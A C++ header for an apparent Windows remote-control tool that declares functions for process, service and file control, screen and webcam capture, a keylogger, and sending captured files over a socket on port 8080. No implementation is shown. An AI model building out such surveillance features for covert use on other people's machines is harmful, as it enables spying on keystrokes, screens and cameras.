#ifndef UTILS_H
#define UTILS_H

#include <map>
#include <vector>
#include <string>
#include <thread>
#include <atomic>
#include <fstream>
#include <sstream>
#include <iomanip>
#include <iostream>
#include <functional>
#include <filesystem>
#include <afxsock.h>
#include <windows.h>
#include <tlhelp32.h>
#include <opencv2/opencv.hpp>

using namespace std;
using namespace cv;

#define PORT 8080
#define BUFFER_SIZE 2048
#define SHUTDOWN_DELAY 15

extern VideoCapture* cap;
extern HHOOK hHook;
extern atomic<bool> keepKeyloggerRunning;
extern ofstream f;
extern stringstream inp, out;
extern string webcamCapturePath, keyloggerCapturePath, screenCapturePath, requestFilePath;

map<string, map<string, function<void()>>> setupHandlers();
string getFileName(const string& filePath);
void getInstruction();
void listApps();
void startApp(LPWSTR appPath);
void stopApp(DWORD processID);
void listServices();
void startServiceByName(LPCWSTR serviceName);
void stopServiceByName(LPCWSTR serviceName);
void shutdownMachine();
void restartMachine();
void copyFile(LPCWSTR src, LPCWSTR dest);
void deleteFile(LPCWSTR filePath);
void captureScreen();
void startKeylogger();
void stopKeylogger();
void startCamera();
void captureCamera();
void stopCamera();
void sendFile(CSocket& socket, const string& filePath);
void enableShutdownPrivilege();

#endif